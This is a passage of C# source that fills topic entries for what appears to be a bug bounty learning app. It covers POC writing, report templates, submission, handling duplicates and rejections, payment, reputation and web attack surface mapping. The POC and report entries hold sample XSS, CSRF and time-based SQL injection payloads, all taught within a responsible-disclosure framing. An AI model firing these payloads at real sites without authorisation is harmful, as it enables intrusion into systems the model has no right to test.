                    new StepItem { Number = 6, Description = "Test IDORs with two accounts", Code = "Increment IDs and access others' resources" }
                },
                Tools = new List<string> { "curl", "nuclei", "subzy", "Burp Suite", "WhatWeb" }
            };

            libraryTopics["First_POC"] = new LibraryTopic
            {
                Tag = "First_POC",
                Category = "Finding Your First Bug",
                Title = "Writing Perfect POCs",
                Subtitle = "Creating Proof of Concept Exploits",
                Content = "A Proof of Concept (POC) demonstrates that a vulnerability is real and exploitable. A good POC clearly shows the vulnerability's existence and impact without causing unnecessary harm.\n\nPOC Requirements: A good POC must be reproducible (anyone can follow the steps and get the same result), minimal (demonstrates the issue with no extra complexity), and safe (doesn't cause data loss or disruption).\n\nPOC by Vulnerability Type:\nXSS: URL that triggers alert box, or form that when submitted shows alert\nIDOR: Request A reading resource of account B successfully\nSQL Injection: Error message or data extraction\nSSRF: Out-of-band DNS callback showing server made request\nOpen Redirect: URL showing redirect to external domain\nCSRF: HTML page that when visited performs unintended action\n\nScreenshots and Recordings: Always include screenshots or video of the POC. Screenshots should show: the input you provided, the vulnerable request in Burp, the response demonstrating the vulnerability.\n\nTest Account Safety: Always use your own test accounts for POCs. Never use real user data. Create accounts specifically for security testing.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "# XSS POC\nhttps://target.com/search?q=<script>alert(document.domain)</script>", Explanation = "Use document.domain instead of alert(1) to prove the domain context." },
                    new CommandItem { Text = "# SSRF POC\nBurp Collaborator URL as the value of the SSRF parameter", Explanation = "Use Burp Collaborator to capture the out-of-band HTTP request." },
                    new CommandItem { Text = "# CSRF POC\n<html><body><form action='https://target.com/action' method='POST'><input name='param' value='value'></form><script>document.forms[0].submit()</script></body></html>", Explanation = "Self-submitting CSRF POC form." },
                    new CommandItem { Text = "# SQLi POC\n' AND SLEEP(5)--", Explanation = "Time-based SQLi POC that causes a measurable delay." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Confirm the vulnerability is real", Code = "Reproduce it at least 3 times" },
                    new StepItem { Number = 2, Description = "Create the minimal POC", Code = "Simplest possible demonstration" },
                    new StepItem { Number = 3, Description = "Test the POC on your own account first", Code = "Never use real victim data" },
                    new StepItem { Number = 4, Description = "Take screenshots or record video", Code = "Show each step clearly" },
                    new StepItem { Number = 5, Description = "Write step-by-step reproduction steps", Code = "Clear enough for a developer to reproduce" },
                    new StepItem { Number = 6, Description = "Note the impact", Code = "What can an attacker do with this?" }
                },
                Tools = new List<string> { "Burp Suite", "Burp Collaborator", "XSS Hunter", "Browser DevTools" }
            };

            libraryTopics["First_Report"] = new LibraryTopic
            {
                Tag = "First_Report",
                Category = "Finding Your First Bug",
                Title = "Professional Report Template",
                Subtitle = "Writing Reports That Get Accepted",
                Content = "A well-written vulnerability report is just as important as finding the vulnerability. Poorly written reports get rejected or downgraded. Professional reports get accepted quickly and paid at appropriate severity.\n\nReport Structure:\n1. Title: Clear, concise vulnerability description\n2. Severity: Critical/High/Medium/Low/Informational with CVSS if applicable\n3. Summary: One paragraph overview of the vulnerability and impact\n4. Vulnerability Details: Technical explanation of how the vulnerability works\n5. Steps to Reproduce: Numbered, clear, reproducible steps\n6. POC: Screenshots, video, or code demonstrating the issue\n7. Impact: Detailed explanation of what an attacker can do\n8. Suggested Fix: Your recommendation for remediation\n9. Supporting Materials: Additional context, references\n\nTitle Best Practices: Include vulnerability type, location, and brief impact. Example: 'Stored XSS in Profile Description Leading to Account Takeover'.\n\nImpact Assessment: Clearly articulate the real-world impact. Don't just say 'SQL injection found.' Say 'SQL injection allows extraction of all user passwords and PII affecting 100,000 users.'\n\nSeverity Justification: Explain why you chose that severity. Reference CVSS, bug bounty triage guidelines, or comparable paid reports.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "## Vulnerability: Reflected XSS in Search Parameter\n**Severity:** Medium\n**CVSS:** 6.1", Explanation = "Example report header with severity and CVSS score." },
                    new CommandItem { Text = "## Steps to Reproduce:\n1. Log in as any user\n2. Navigate to /search\n3. Enter payload: <img src=x onerror=alert(document.domain)>\n4. Click search\n5. Observe alert box confirming XSS execution", Explanation = "Clear numbered steps any developer can follow." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Write clear, descriptive title", Code = "[Type] [Location] [Impact summary]" },
                    new StepItem { Number = 2, Description = "Assess severity honestly", Code = "Use program's severity guidelines" },
                    new StepItem { Number = 3, Description = "Write concise summary paragraph", Code = "Who is affected, what can happen" },
                    new StepItem { Number = 4, Description = "Write numbered reproduction steps", Code = "Start from unauthenticated state" },
                    new StepItem { Number = 5, Description = "Include POC screenshots/video", Code = "Show each critical step" },
                    new StepItem { Number = 6, Description = "Clearly explain impact", Code = "Attacker can steal cookies, access PII, etc." },
                    new StepItem { Number = 7, Description = "Suggest a fix", Code = "Shows professionalism, helps dev team" }
                },
                Tools = new List<string> { "HackerOne", "Bugcrowd", "Intigriti", "Markdown" }
            };

            libraryTopics["First_Submit"] = new LibraryTopic
            {
                Tag = "First_Submit",
                Category = "Finding Your First Bug",
                Title = "How to Submit Reports",
                Subtitle = "Navigating the Submission Process",
                Content = "Submitting your bug bounty report correctly is important for timely triage and fair payment. Each platform has slightly different workflows, but the fundamentals are the same.\n\nBefore Submitting: Double-check the vulnerability is in scope. Confirm the program still accepts this type of report (check for recent similar reports in Hacktivity). Verify you haven't already reported this. Test one more time to confirm reproducibility.\n\nHackerOne Submission Process: Navigate to the program's page. Click 'Submit Report.' Select vulnerability type from dropdown. Fill in title, severity, details, steps to reproduce. Attach screenshots and files. Submit and wait for triage.\n\nBugcrowd Submission Process: Similar to HackerOne. Select 'Submit a Bug' on the program page. Choose vulnerability type and target. Fill in required fields. Use Markdown for formatting.\n\nResponse Timeline Expectations: Most programs acknowledge within 1-3 business days. Triage (accept/reject decision) typically takes 1-7 days. Resolution can take weeks to months depending on complexity. Payment often comes after resolution.\n\nPost-Submission: Don't publicly disclose until the program gives permission. It's acceptable to ask for a status update after 7+ business days of no response. Stay professional in all communication.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Verify target is in scope one final time", Code = "Re-read the program policy" },
                    new StepItem { Number = 2, Description = "Check Hacktivity for duplicate reports", Code = "Search for similar vulnerabilities already reported" },
                    new StepItem { Number = 3, Description = "Reproduce vulnerability one final time", Code = "Confirm it's still present" },
                    new StepItem { Number = 4, Description = "Write and format the report", Code = "Use Markdown for formatting" },
                    new StepItem { Number = 5, Description = "Attach all screenshots and POC materials", Code = "Clear, labeled screenshots" },
                    new StepItem { Number = 6, Description = "Submit and set a reminder for 7 days", Code = "Follow up if no acknowledgment" },
                    new StepItem { Number = 7, Description = "Do not disclose publicly", Code = "Wait for program's permission" }
                },
                Tools = new List<string> { "HackerOne", "Bugcrowd", "Intigriti", "YesWeHack" }
            };

            libraryTopics["First_Duplicates"] = new LibraryTopic
            {
                Tag = "First_Duplicates",
                Category = "Finding Your First Bug",
                Title = "Dealing with Duplicates",
                Subtitle = "Handling Duplicate Vulnerability Reports",
                Content = "Duplicate reports are one of the most frustrating experiences in bug bounty. When your valid vulnerability report is marked as duplicate, it means someone else found and reported it before you. Duplicates earn no reward on most platforms.\n\nWhy Duplicates Happen: Popular vulnerabilities get found by many researchers simultaneously. The same endpoint gets tested by multiple people. Previously reported but unresolved bugs are found again.\n\nMinimizing Duplicate Risk:\n1. Work on private programs where fewer people have access\n2. Focus on newly launched programs\n3. Test less-obvious attack surfaces (non-indexed pages, weird parameters)\n4. Work on programs with smaller researcher communities\n5. Test new features as soon as they launch\n6. Focus on complex vulnerabilities requiring more skill\n\nWhen Marked Duplicate: Accept it graciously. Ask politely if you can see the original report number after disclosure. Learn from it - your methodology is working if you found a real bug. Move on quickly.\n\nHacktivity Research: Review Hacktivity before testing to see what has been recently found and resolved. Avoids testing areas already thoroughly tested.\n\nSome platforms pay partial bounties for duplicates if you're first runner-up.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Research program's Hacktivity before testing", Code = "See recent reports to avoid already-found issues" },
                    new StepItem { Number = 2, Description = "Focus on less-tested attack surfaces", Code = "Mobile API, recently added features" },
                    new StepItem { Number = 3, Description = "Join private programs when possible", Code = "Fewer researchers = fewer duplicates" },
                    new StepItem { Number = 4, Description = "Test new features immediately after launch", Code = "First-mover advantage" },
                    new StepItem { Number = 5, Description = "Accept duplicates professionally", Code = "Respond professionally, learn, move on" }
                },
                Resources = new List<string>
                {
                    "https://www.hackerone.com/hacktivity",
                    "https://bugcrowd.com/crowdstream"
                }
            };

            libraryTopics["First_Communication"] = new LibraryTopic
            {
                Tag = "First_Communication",
                Category = "Finding Your First Bug",
                Title = "Communicating with Teams",
                Subtitle = "Professional Hacker-to-Company Communication",
                Content = "Professional, clear, and patient communication with security teams is essential for success in bug bounty. How you communicate can affect triage decisions, bounty amounts, and future program invitations.\n\nCommunication Best Practices:\n1. Be concise and clear\n2. Use professional language always\n3. Provide complete information upfront\n4. Be patient - security teams are busy\n5. Follow up politely, not aggressively\n6. Accept decisions gracefully even if you disagree\n7. Ask constructive questions\n\nWhen to Follow Up: After 7 business days with no acknowledgment, one follow-up is appropriate. After 14 business days with no triage decision, another follow-up is reasonable. Never send multiple follow-ups in short succession.\n\nDisagreeing with Decisions: If you disagree with severity assessment or validity decision, provide technical arguments politely. Reference similar bounties or CVSS guidelines. Don't demand or threaten. Accept final decisions.\n\nBuilding Relationships: Long-term positive relationships with security teams lead to private program invitations, higher bounties, and references. Treat every interaction as networking.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Write clear, complete initial report", Code = "Include everything needed to triage" },
                    new StepItem { Number = 2, Description = "Respond promptly when team asks questions", Code = "Within 24-48 hours when possible" },
                    new StepItem { Number = 3, Description = "Follow up after 7 days if no acknowledgment", Code = "One polite message" },
                    new StepItem { Number = 4, Description = "Disagree constructively if needed", Code = "Technical arguments, not emotional" },
                    new StepItem { Number = 5, Description = "Thank team when resolved", Code = "Builds positive relationship" }
                }
            };

            libraryTopics["First_Stories"] = new LibraryTopic
            {
                Tag = "First_Stories",
                Category = "Finding Your First Bug",
                Title = "First Bounty Success Stories",
                Subtitle = "How Hunters Found Their First Bugs",
                Content = "Learning from others' first bug stories is both inspiring and educational. Common patterns emerge in how researchers found their first vulnerability.\n\nCommon First Bug Types: Open redirect in forgotten parameter. IDOR by incrementing user ID. Exposed .git directory revealing source code. Missing CSRF token on sensitive action. XSS in search parameter. Subdomain takeover on expired CNAME.\n\nCommon First Bug Patterns:\n- Found while casually browsing, not hunting\n- Parameter they tested 'just to see what happens'\n- Old endpoint discovered via Wayback Machine\n- Simple mistake in a forgotten feature\n- Default credentials on a recently added admin panel\n\nKey Lessons from First Bugs:\n1. Start with programs that have clear scope\n2. Read program's past disclosures\n3. Test thoroughly before moving on\n4. The simple things get missed most often\n5. Persistence pays off\n\nWhere to Read First Bug Stories: Infosec writeups, Medium articles, Twitter threads, HackerOne's Hacktivity, Bugcrowd CrowdStream, conference talks.",
                Resources = new List<string>
                {
                    "https://infosecwriteups.com/",
                    "https://medium.com/tag/bug-bounty",
                    "https://www.hackerone.com/hacktivity",
                    "https://pentester.land/list-of-bug-bounty-writeups.html",
                    "https://github.com/ngalongc/bug-bounty-reference"
                }
            };

            libraryTopics["First_Mistakes"] = new LibraryTopic
            {
                Tag = "First_Mistakes",
                Category = "Finding Your First Bug",
                Title = "Common Beginner Mistakes",
                Subtitle = "Avoiding the Pitfalls of New Bug Hunters",
                Content = "Learning from common mistakes saves time and frustration. These are the errors nearly every beginner makes at some point.\n\nTop Beginner Mistakes:\n\n1. Testing Out of Scope: Not reading the policy carefully. Testing third-party services. Testing domains not explicitly in scope.\n\n2. Not Reading the Policy: Missing out-of-scope items. Not seeing test account instructions. Missing reporting requirements.\n\n3. Rushing Reports: Submitting before fully confirming the vulnerability. Incomplete reproduction steps. Missing screenshots.\n\n4. Overestimating Severity: Calling XSS on a static page 'critical.' Severity depends on real-world impact.\n\n5. Giving Up Too Early: Moving to new targets without thorough testing. 'Low-hanging fruit' mindset.\n\n6. Targeting Popular Programs First: Amazon, Google, Facebook have thousands of researchers. Fewer bugs, more competition.\n\n7. Ignoring Mobile and API: Web-focused only. API and mobile often have separate, less-tested attack surface.\n\n8. Not Documenting: Forgetting what was tested. Losing track of findings. Not recording commands used.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Always read the full program policy", Code = "Before testing anything" },
                    new StepItem { Number = 2, Description = "Start with less popular programs", Code = "VDPs and new programs" },
                    new StepItem { Number = 3, Description = "Document everything you test", Code = "Notes, screenshots, commands" },
                    new StepItem { Number = 4, Description = "Verify before reporting", Code = "Reproduce 3 times minimum" },
                    new StepItem { Number = 5, Description = "Be conservative with severity", Code = "Underestimate and explain, don't overestimate" },
                    new StepItem { Number = 6, Description = "Test thoroughly before moving on", Code = "Spend adequate time on each target" }
                }
            };

            libraryTopics["First_Time"] = new LibraryTopic
            {
                Tag = "First_Time",
                Category = "Finding Your First Bug",
                Title = "Time Management Strategies",
                Subtitle = "Optimizing Your Bug Hunting Schedule",
                Content = "Effective time management is crucial for consistent bug bounty success. The best hunters are strategic about how they spend their time.\n\nTime Allocation Framework:\n- 40% Reconnaissance: Understanding attack surface\n- 30% Manual Testing: Deep testing of interesting areas\n- 20% Automation: Running tools while doing manual work\n- 10% Learning: Reading writeups, new techniques\n\nWhen to Move On: Spend 2-4 hours on a target before moving on. If nothing promising after thorough recon, try a different program. Come back later with fresh eyes.\n\nAutomation During Testing: Run automated tools (nuclei, sqlmap) in background while doing manual testing. This maximizes tool-time without losing manual attention.\n\nPeak Productivity: Some hunters find they're most productive at night when fewer users are active. Others prefer morning focus sessions. Find your peak time and protect it.\n\nProgress Tracking: Track which programs you've tested, what areas, what findings. Prevents duplicating effort. Helps identify patterns in what you find.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Set dedicated hunting sessions", Code = "2-4 hour focused blocks" },
                    new StepItem { Number = 2, Description = "Run automation while doing manual testing", Code = "nuclei, nmap in background" },
                    new StepItem { Number = 3, Description = "Track what you've tested", Code = "Spreadsheet or notes file" },
                    new StepItem { Number = 4, Description = "Allocate learning time weekly", Code = "Read writeups, practice labs" },
                    new StepItem { Number = 5, Description = "Rotate between targets to stay fresh", Code = "2-3 active programs at a time" }
                }
            };
        }

        private void InitializeAfterBugs()
        {
            libraryTopics["After_Next"] = new LibraryTopic
            {
                Tag = "After_Next",
                Category = "After Finding Bugs",
                Title = "What to Do Next Steps",
                Subtitle = "Actions After Submitting a Report",
                Content = "Once you've submitted a vulnerability report, there are important steps to take while waiting for triage and after receiving a response.\n\nImmediately After Submission: Save a copy of your report locally. Note the date of submission and report ID. Continue testing the same program for more bugs. Do not attempt further exploitation of the vulnerability.\n\nWhile Waiting for Triage: Expect 1-7 business days for most programs. Continue working on other targets. Read more writeups and improve your skills. Prepare for follow-up questions.\n\nWhen Report is Accepted: Thank the team briefly. If severity is lower than expected, provide a polite technical argument. Ask about timeline if interested. Continue testing.\n\nWhen Report is Rejected: Ask for clarification on why. Understand if it's truly invalid or misunderstood. If you believe the decision is wrong, appeal with additional technical evidence. Accept final decisions professionally.\n\nAfter Resolution: Ask if you can write a public disclosure. Add to your portfolio. Share learnings with community while maintaining responsible disclosure.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Save report copy locally", Code = "Document all details before moving on" },
                    new StepItem { Number = 2, Description = "Continue testing same program", Code = "One bug often leads to more" },
                    new StepItem { Number = 3, Description = "Wait for triage (7 days)", Code = "Be patient during this period" },
                    new StepItem { Number = 4, Description = "Respond to questions promptly", Code = "Within 24-48 hours" },
                    new StepItem { Number = 5, Description = "After resolution, request disclosure permission", Code = "To write public writeup" }
                }
            };

            libraryTopics["After_Reporting"] = new LibraryTopic
            {
                Tag = "After_Reporting",
                Category = "After Finding Bugs",
                Title = "Reporting Best Practices",
                Subtitle = "Writing Reports That Get Paid",
                Content = "The quality of your report directly impacts whether you get paid and how much. High-quality reports are triaged faster, accepted at appropriate severity, and lead to repeat bounties from the same team.\n\nReport Quality Factors:\n1. Clear title that immediately describes the issue\n2. Accurate severity with justification\n3. Concise but complete summary\n4. Step-by-step reproduction that actually works\n5. Clear POC with screenshots\n6. Business impact explanation\n7. Suggested remediation\n\nFormatting: Use Markdown formatting on platforms that support it. Headers, code blocks, and bullet points make reports easier to read. Use code blocks for payloads and commands.\n\nTriage-Friendly Reports: Triagers read dozens of reports daily. Make their job easy. Clear reports get triaged faster. Ambiguous reports sit in the queue.\n\nReport Length: Be thorough but concise. A great report is usually 300-800 words plus screenshots. Don't pad with unnecessary information.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Write title as [VulnType] [Location] [Impact]", Code = "Reflected XSS in /search endpoint via q parameter" },
                    new StepItem { Number = 2, Description = "Justify severity with impact analysis", Code = "Explain what attacker can do" },
                    new StepItem { Number = 3, Description = "Test reproduction steps yourself", Code = "Follow your own steps from fresh browser" },
                    new StepItem { Number = 4, Description = "Include labeled screenshots", Code = "Label each screenshot" },
                    new StepItem { Number = 5, Description = "Suggest specific fix", Code = "Shows expertise and helps the team" }
                }
            };

            libraryTopics["After_Comm"] = new LibraryTopic
            {
                Tag = "After_Comm",
                Category = "After Finding Bugs",
                Title = "Professional Communication",
                Subtitle = "Building Relationships with Security Teams",
                Content = "Professional communication with security teams is a skill that directly affects your bug bounty success. Teams remember researchers who are professional, responsive, and collaborative.\n\nCommunication Principles:\nBe Professional: Always use professional language. Never use threatening or entitled language. Even when frustrated, maintain composure.\nBe Concise: Security team members are busy. Get to the point. Provide only relevant information.\nBe Patient: Triage takes time. Resolution takes even more. Understand they have other responsibilities.\nBe Responsive: When they ask for clarification, respond within 24-48 hours.\nBe Collaborative: Help them understand and fix the issue. Provide additional information proactively.\n\nWhen You Disagree: It's okay to politely dispute a severity decision or rejection. Provide technical justification. Reference CVSS, similar paid reports, or real-world impact. Never threaten or demand.\n\nBuilding Long-term Relationships: Researchers who communicate well get invited to private programs, get better bounties, and sometimes get job offers from the companies they test.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Acknowledge triage responses quickly", Code = "Within 24 hours" },
                    new StepItem { Number = 2, Description = "Provide extra info proactively", Code = "If you discover more impact, update the report" },
                    new StepItem { Number = 3, Description = "Express disagreements technically", Code = "Evidence-based, not emotional" },
                    new StepItem { Number = 4, Description = "Thank teams for quick responses", Code = "A small thank you goes a long way" },
                    new StepItem { Number = 5, Description = "Stay engaged through resolution", Code = "Verify fix if asked" }
                }
            };

            libraryTopics["After_Payment"] = new LibraryTopic
            {
                Tag = "After_Payment",
                Category = "After Finding Bugs",
                Title = "Getting Paid Guide",
                Subtitle = "Receiving and Managing Bug Bounty Payments",
                Content = "Getting paid for your bug bounty findings requires understanding the platform's payment process, tax implications, and payment options.\n\nPayment Methods: HackerOne and Bugcrowd both support PayPal and bank transfer. Some also support cryptocurrency. Intigriti and YesWeHack have similar options. Verify your payment details are correct before your first payment.\n\nPayment Timing: Most platforms pay after the vulnerability is marked as resolved or at certain milestones. Some programs pay immediately on triage. Always check the program's stated payment timeline.\n\nTax Implications: Bug bounty income is taxable in most jurisdictions. Keep records of all payments. Consider consulting a tax professional for guidance on reporting freelance income. Platforms may issue 1099 forms in the US if you earn over the threshold.\n\nPlatform Reputation Points vs Money: Different programs pay at different points. Some pay on triage, others on resolution, others on a schedule. Understand the program's payment policy.\n\nPayment Issues: If a payment is delayed, check platform policies first. Contact platform support before contacting the company. Most payment issues are administrative, not bad faith.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Set up payment method on each platform", Code = "PayPal, bank transfer, crypto" },
                    new StepItem { Number = 2, Description = "Verify tax information is set up correctly", Code = "W-9 for US, W-8BEN for international" },
                    new StepItem { Number = 3, Description = "Track all earnings in a spreadsheet", Code = "Date, program, amount, vulnerability type" },
                    new StepItem { Number = 4, Description = "Understand platform's payment schedule", Code = "Some pay on triage, some on resolution" },
                    new StepItem { Number = 5, Description = "Save receipts and payment confirmations", Code = "For tax purposes" }
                },
                Tools = new List<string> { "PayPal", "Payoneer", "Wise", "Bank transfer" }
            };

            libraryTopics["After_Rep"] = new LibraryTopic
            {
                Tag = "After_Rep",
                Category = "After Finding Bugs",
                Title = "Building Your Reputation",
                Subtitle = "Growing Your Bug Bounty Career",
                Content = "Your reputation in the bug bounty community opens doors to private programs, better opportunities, and career advancement. Building reputation takes time but compounds significantly.\n\nReputation Factors:\n1. Signal-to-noise ratio (valid vs invalid reports)\n2. Report quality\n3. Responsiveness and professionalism\n4. Community contributions\n5. Hall of fame entries\n6. Platform ranking\n7. Public writeups\n\nPlatform Rankings: HackerOne and Bugcrowd have leaderboards. High rankings attract private program invitations and media attention.\n\nPublic Writeups: Writing public disclosures after program permission educates the community and establishes your expertise. Quality writeups are read widely and build your personal brand.\n\nConference Speaking: Presenting bug bounty findings at security conferences (DEF CON, Black Hat, BSides) dramatically increases visibility.\n\nMentoring: Helping newer researchers builds your reputation as a community leader and is personally rewarding.\n\nSocial Media: Many top bug hunters share findings, tips, and insights on Twitter/X. Building a following attracts program invitations.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Focus on quality, not quantity of reports", Code = "High signal-to-noise ratio is tracked" },
                    new StepItem { Number = 2, Description = "Write public writeups after disclosure", Code = "Publish on Medium or personal blog" },
                    new StepItem { Number = 3, Description = "Engage in security community on Twitter", Code = "Share tips, retweet, discuss" },
                    new StepItem { Number = 4, Description = "Aim for top rankings on platforms", Code = "HackerOne top hackers list" },
                    new StepItem { Number = 5, Description = "Apply to speak at security conferences", Code = "DEF CON, Black Hat, BSides events" }
                },
                Resources = new List<string>
                {
                    "https://infosecwriteups.com/",
                    "https://medium.com/tag/bug-bounty",
                    "https://www.hackerone.com/leaderboard"
                }
            };

            libraryTopics["After_Network"] = new LibraryTopic
            {
                Tag = "After_Network",
                Category = "After Finding Bugs",
                Title = "Networking with Hackers",
                Subtitle = "Building Your Security Community Network",
                Content = "The bug bounty community is collaborative and supportive. Building a network of fellow researchers accelerates learning, provides motivation, and creates opportunities.\n\nNetworking Channels:\n1. Twitter/X - Most active security researcher community\n2. Discord servers - Bug bounty specific servers\n3. HackerOne Discord\n4. Bugcrowd Discord\n5. Reddit r/bugbounty\n6. Security conferences\n7. Local security meetups\n8. CTF competitions\n\nBenefits of Networking: Learning new techniques from peers, sharing exclusive tips and tricks, finding collaboration partners, getting job referrals, private program invitations.\n\nGiving Back: The best networkers give as much as they take. Share your knowledge, answer questions in community forums, write educational content.\n\nConferences: DEF CON, Black Hat, BSidesLV, NullCon, Security BSides events globally. Meeting people in person builds stronger relationships than online.\n\nCTF Competitions: Capture the Flag competitions build skills and connect you with like-minded hackers. CTF teams are great for building relationships.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Create Twitter/X account and follow top hunters", Code = "@NahamSec, @stokfredrik, @tomnomnom, @hakluke" },
                    new StepItem { Number = 2, Description = "Join bug bounty Discord servers", Code = "HackerOne, Bugcrowd, NahamSec community" },
                    new StepItem { Number = 3, Description = "Engage in community discussions", Code = "Answer questions, share tips" },
                    new StepItem { Number = 4, Description = "Attend security conferences", Code = "DEF CON, BSides events" },
                    new StepItem { Number = 5, Description = "Participate in CTF competitions", Code = "CTFtime.org for upcoming events" }
                },
                Resources = new List<string>
                {
                    "https://www.reddit.com/r/bugbounty/",
                    "https://ctftime.org/",
                    "https://defcon.org/"
                }
            };

            libraryTopics["After_Learn"] = new LibraryTopic
            {
                Tag = "After_Learn",
                Category = "After Finding Bugs",
                Title = "Continuous Learning Path",
                Subtitle = "Staying Sharp and Growing Your Skills",
                Content = "The security field evolves constantly. New attack techniques, defenses, and technologies emerge regularly. Continuous learning is essential to stay competitive in bug bounty.\n\nLearning Resources:\n1. PortSwigger Web Security Academy - Free, excellent labs\n2. HackTheBox - Practical challenges\n3. TryHackMe - Guided learning paths\n4. PentesterLab - Web application exercises\n5. Bug bounty writeups - Real-world techniques\n6. Security conference talks (YouTube)\n7. Research papers and blogs\n\nLearning from Reports: When programs disclose fixed vulnerabilities, study the report. Understand why it was vulnerable. Think about where you might find similar issues.\n\nFollow Security Research: Follow researchers at Google Project Zero, Synk, PortSwigger, and independent security researchers. They publish cutting-edge research that eventually becomes bug bounty targets.\n\nSpecialization: Consider specializing in specific areas (mobile, IoT, cryptography, API security). Deep expertise in one area is often more valuable than shallow knowledge of many.\n\nReversal Engineering Disclosures: When a CVE is published for software you test, understand the vulnerability before it's patched and hunt for it in bug bounty programs.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Complete PortSwigger Web Security Academy", Code = "https://portswigger.net/web-security" },
                    new StepItem { Number = 2, Description = "Read 2+ bug bounty writeups weekly", Code = "infosecwriteups.com, medium.com" },
                    new StepItem { Number = 3, Description = "Practice on HackTheBox or TryHackMe", Code = "Regularly solve new challenges" },
                    new StepItem { Number = 4, Description = "Watch DEF CON/Black Hat talks", Code = "YouTube: DEF CON channel" },
                    new StepItem { Number = 5, Description = "Follow top security researchers", Code = "Twitter, blogs, GitHub" }
                },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security",
                    "https://www.hackthebox.com/",
                    "https://tryhackme.com/",
                    "https://pentesterlab.com/",
                    "https://www.youtube.com/@DEFCONConference",
                    "https://infosecwriteups.com/"
                }
            };

            libraryTopics["After_Rejection"] = new LibraryTopic
            {
                Tag = "After_Rejection",
                Category = "After Finding Bugs",
                Title = "Handling Rejections",
                Subtitle = "Dealing with Rejected Vulnerability Reports",
                Content = "Rejections are a normal part of bug bounty. Even experienced hunters have reports rejected regularly. How you handle rejections determines your long-term success.\n\nCommon Rejection Reasons:\n1. Out of scope - Not in the program's scope\n2. Not a vulnerability - Expected behavior or acceptable risk\n3. Duplicate - Already reported by someone else\n4. Informational only - Not severe enough for a bounty\n5. Cannot reproduce - Steps unclear or environment different\n6. Won't fix - Known issue they've accepted the risk of\n\nResponding to Rejections: Read the rejection reason carefully. If 'out of scope,' accept it. If 'not a vulnerability,' you can politely ask why or provide additional evidence. If 'cannot reproduce,' provide clearer steps.\n\nLearning from Rejections: Every rejection is a learning opportunity. If 'not a vulnerability,' understand why. If 'duplicate,' understand what the original report looked like.\n\nKeeping Perspective: Top hunters have 50%+ valid rates. 30-40% valid rates are common for beginners. Each rejection improves your judgment. The goal is improvement, not perfection.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Read rejection reason carefully", Code = "Understand specifically why it was rejected" },
                    new StepItem { Number = 2, Description = "Accept scope rejections without argument", Code = "They're correct if it's truly out of scope" },
                    new StepItem { Number = 3, Description = "Ask clarifying questions politely", Code = "If you genuinely don't understand why" },
                    new StepItem { Number = 4, Description = "Learn from each rejection", Code = "Update your methodology" },
                    new StepItem { Number = 5, Description = "Move on quickly to next target", Code = "Don't dwell, keep hunting" }
                }
            };

            libraryTopics["After_Scale"] = new LibraryTopic
            {
                Tag = "After_Scale",
                Category = "After Finding Bugs",
                Title = "Scaling Your Success",
                Subtitle = "Growing Your Bug Bounty Income",
                Content = "Once you've found your first few bugs, scaling your success requires optimizing your workflow, targeting high-value programs, and developing automation.\n\nScaling Strategies:\n1. Better programs - Move to high-paying private programs\n2. Automation - Automate repetitive recon tasks\n3. Specialization - Go deeper in one vulnerability class\n4. Team hunting - Collaborate with other researchers\n5. Custom tools - Build tools for your specific methodology\n6. Template recon - Reuse recon infrastructure\n\nPrivate Program Access: Top researchers on public programs get invited to private programs. Private programs pay more, have less competition, and have more accessible bugs.\n\nAutomation Investment: Build infrastructure that continuously monitors targets. New subdomains, new endpoints, parameter changes can all be automated alerts.\n\nFrom Part-time to Full-time: Top hunters earn $100K-$500K+ annually. Full-time requires consistency, specialization, and systematic approach.\n\nDiversification: Spread across multiple programs and vulnerability types. One program changing scope shouldn't devastate your income.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Build automated recon infrastructure", Code = "Subdomain monitoring, new endpoint alerts" },
                    new StepItem { Number = 2, Description = "Apply for private program invitations", Code = "Improve public program rankings" },
                    new StepItem { Number = 3, Description = "Specialize in high-value vulnerability classes", Code = "Logic bugs, auth bypass, API security" },
                    new StepItem { Number = 4, Description = "Track ROI by program and vulnerability type", Code = "Spend more time where you earn more" },
                    new StepItem { Number = 5, Description = "Consider collaborating with other hunters", Code = "Some bugs require multiple skill sets" }
                }
            };
        }

        
        private void InitializeWebExploitation()
        {
            libraryTopics["Web_Surface"] = new LibraryTopic
            {
                Tag = "Web_Surface",
                Category = "Web Exploitation",
                Title = "Understanding Attack Surface",
                Subtitle = "Mapping the Web Application Attack Surface",
                Content = "The attack surface of a web application is the set of all possible ways an attacker could interact with or exploit the application. Understanding and mapping the attack surface is the first step in web exploitation.\n\nAttack Surface Components:\n1. Input vectors - All places where user data enters the application\n2. Output vectors - All places where data is returned to users\n3. Authentication mechanisms - Login, password reset, session management\n4. Authorization controls - Access control points\n5. Third-party integrations - External services the app uses\n6. APIs - Both public and internal\n7. File operations - Upload, download, include\n8. Network services - Ports, protocols, services\n\nMapping Input Vectors: Every form field, URL parameter, cookie value, HTTP header, and hidden field is a potential input vector. Crawl the application thoroughly to find all inputs.\n\nAPI Attack Surface: Modern applications often have extensive APIs. Use browser DevTools to capture API calls while using the application. APIs often have less input validation than user-facing endpoints.\n\nReducing False Positives: Not every input is a high-risk target. Prioritize based on: what data is processed, what actions are performed, what permissions are involved.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "hakrawler -url https://target.com -depth 3 -plain", Explanation = "Crawl website to discover all URLs and endpoints." },
